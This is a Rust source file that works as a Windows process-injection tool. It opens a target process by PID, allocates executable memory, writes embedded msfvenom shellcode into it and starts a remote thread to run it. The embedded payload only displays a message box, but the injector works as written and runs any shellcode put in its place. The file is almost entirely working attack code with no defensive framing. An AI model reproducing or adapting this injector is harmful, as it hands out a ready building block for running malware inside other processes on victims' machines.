use std::ffi::c_void;

use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::VirtualAllocEx,
        Threading::{CreateRemoteThreadEx, OpenProcess},
    },
};

// Generated using:
//   msfvenom -p windows/x64/messagebox -f rust title="Noice!" text="Successfully injected the payload"
const SHELLCODE: [u8; 334] = [
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41,
    0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52,
    0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
    0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1,
    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e,
    0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
    0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
    0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d,
    0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
    0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b,
    0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c,
    0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
    0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
    0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x3e, 0x48,
    0x8d, 0x8d, 0x36, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x49, 0xc7,
    0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
    0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5,
    0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x53, 0x75, 0x63, 0x63, 0x65,
    0x73, 0x73, 0x66, 0x75, 0x6c, 0x6c, 0x79, 0x20, 0x69, 0x6e, 0x6a, 0x65, 0x63, 0x74, 0x65, 0x64,
    0x20, 0x74, 0x68, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00, 0x4e, 0x6f, 0x69,
    0x63, 0x65, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00,
];

fn main() {
    let pid = std::env::args()
        .nth(1)
        .unwrap_or_else(|| {
            eprintln!("USAGE: .exe <PID>");

            std::process::exit(1);
        })
        .trim()
        .parse::<u32>()
        .unwrap_or_else(|_| {
            eprintln!("[-] invalid PID");

            std::process::exit(1);
        });

    // PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE
    let desired_access = 0x0002 | 0x0008 | 0x0020;

    println!("[:] opening process with PID {pid}");
    let handle = unsafe { OpenProcess(desired_access, false.into(), pid) };

    if handle == 0 {
        exit_with_error("failed to open process");
    }

    // MEM_COMMIT | MEM_RESERVE
    let allocation_type = 0x00001000 | 0x00002000;
    // PAGE_EXECUTE_READWRITE
    let protection_type = 0x40;

    println!("[:] allocating virtual memory");
    let base_address = unsafe {
        VirtualAllocEx(
            handle,
            std::ptr::null(),
            SHELLCODE.len(),
            allocation_type,
            protection_type,
        )
    };

    if base_address.is_null() {
        exit_with_error("failed to allocate memory");
    }

    println!("[:] writing shellcode into allocated memory");
    let result = unsafe {
        WriteProcessMemory(
            handle,
            base_address,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE.len(),
            std::ptr::null_mut(),
        )
    };

    if result == 0 {
        exit_with_error("failed to write process memory");
    }

    println!("[:] creating remote thread");
    let mut tid = std::mem::MaybeUninit::uninit();
    let thread_handle = unsafe {
        // make a function pointer from *mut c_void
        let base_address = std::mem::transmute(base_address);

        CreateRemoteThreadEx(
            handle,
            std::ptr::null(),
            0,
            Some(base_address),
            std::ptr::null(),
            0,
            std::ptr::null_mut(),
            tid.as_mut_ptr(),
        )
    };

    if thread_handle == 0 {
        exit_with_error("failed to create remote thread");
    }

    println!("[+] remote thread created with TID {}", unsafe {
        tid.assume_init()
    });
    println!("[+] successfully injected shellcode");

    println!("[:] cleaning up...");
    println!("[:] closing process handle");
    let result = unsafe { CloseHandle(handle) };

    if result == 0 {
        exit_with_error("failed to close process handle");
    }

    println!("[+] successfuly closed process handle; exiting...");
}

fn exit_with_error(error: &str) {
    eprintln!("[-] {error}: {}", unsafe { GetLastError() });

    std::process::exit(1);
}
